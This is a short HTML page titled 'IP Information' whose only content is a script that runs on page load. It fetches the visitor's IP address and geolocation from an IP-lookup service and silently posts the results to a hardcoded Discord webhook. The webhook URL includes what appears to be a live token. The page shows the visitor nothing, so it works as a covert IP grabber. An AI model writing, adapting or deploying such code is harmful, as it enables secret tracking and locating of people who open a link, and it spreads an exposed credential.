<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>IP Information</title>
</head>
<body>
<script>
let FINALL = "";
const WEBHOOK_URL = "https://discord.com/api/webhooks/1564969198948589728/bhXE0ehqTxTRlPzDHtj9askJxYN4BYI9kE5XH2yEFprDrcwiDWUOLgHdDdN9s88_G-7L";

function flattenObject(obj, prefix = "") {
    let lines = [];

    for (const [key, value] of Object.entries(obj)) {
        const name = prefix
            ? prefix + "-" + key
            : key;

        if (value !== null && typeof value === "object") {
            lines.push(...flattenObject(value, name));
        } else {
            lines.push(`${name}: ||${value === null ? "null" : value}||`);
        }
    }

    return lines;
}

async function sendReport() {
    const response = await fetch("https://ipwho.is/");

    if (!response.ok) {
        throw new Error("IP lookup failed: " + response.status);
    }

    FINALL = await response.text();

    const data = JSON.parse(FINALL);
    const lines = flattenObject(data);
    const chunks = [];
    let current = "";

    for (const line of lines) {
        const next = current ? current + "\n" + line : line;

        if (next.length > 1900) {
            chunks.push(current);
            current = line;
        } else {
            current = next;
        }
    }

    if (current) chunks.push(current);

    for (let i = 0; i < chunks.length; i++) {
        const content =
            "```text\n" +
            (chunks.length > 1
                ? `--\nIP INFORMATION (${i + 1}/${chunks.length})\n`
                : "IP INFORMATION\n") +
            chunks[i] +
            "\n```";

        const result = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content })
        });

        if (!result.ok) {
            throw new Error("Webhook failed: " + result.status);
        }
    }

    console.log("Report sent successfully!");
}

sendReport().catch(error => console.error(error));
</script>
</body>
</html>
